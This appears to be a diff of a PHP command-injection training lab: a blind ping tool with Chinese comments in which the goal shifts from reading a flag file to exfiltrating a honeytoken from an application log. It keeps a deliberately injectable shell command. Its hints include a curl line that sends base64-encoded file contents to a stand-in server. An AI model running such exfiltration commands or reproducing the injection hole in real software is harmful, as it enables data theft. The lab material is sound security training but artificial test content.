@@ -3,7 +3,8 @@
  * 命令注入 L5 - 无回显外带 (OOB)
  * 注入上下文: ping -c 1 $input >/dev/null (无回显，需外带)
  * WAF难点: 盲命令执行无回显，攻击走 DNS/HTTP 外带，WAF 难以关联因果
- * 成功标志: 通过 DNS/HTTP 外带方式读取 /flag.txt 第五行 flag{cmdi_l5_00b_3xf1ltr4t10n}
+ * 蜜标位置: /app/logs/app.log (hp-6c8f2e4a)
+ * 成功标志: 输出中包含蜜标 hp-[0-9a-f]{8}
  */
 
 $cmd = $_GET['cmd'] ?? '127.0.0.1';
@@ -36,10 +37,10 @@ $pingSuccess = ($output !== false);
     <h2>🔫 命令注入 L5 — 无回显外带 (OOB)</h2>
     <div class="info">
         <strong>说明:</strong> Ping 工具，输出重定向到 /dev/null，完全无回显。<br>
-        <strong>目标:</strong> 通过 DNS/HTTP 外带方式读取 <code>/flag.txt</code><br>
+        <strong>目标:</strong> 通过 DNS/HTTP 外带方式读取 <code>/app/logs/app.log</code> 获取蜜标 hp-6c8f2e4a<br>
         <strong>命令:</strong> <span class="code">ping -c 1 <?php echo htmlspecialchars($cmd); ?> >/dev/null 2>&1</span><br>
         <strong>提示:</strong> 使用 backtick 嵌套执行，将 flag 内容拼入 DNS 查询域名进行外带<br>
-        <small>例: `curl http://yourserver/$(cat /flag.txt|base64)`</small>
+        <small>例: `curl http://yourserver/$(cat /app/logs/app.log|base64)`</small>
     </div>
 
     <form method="GET">
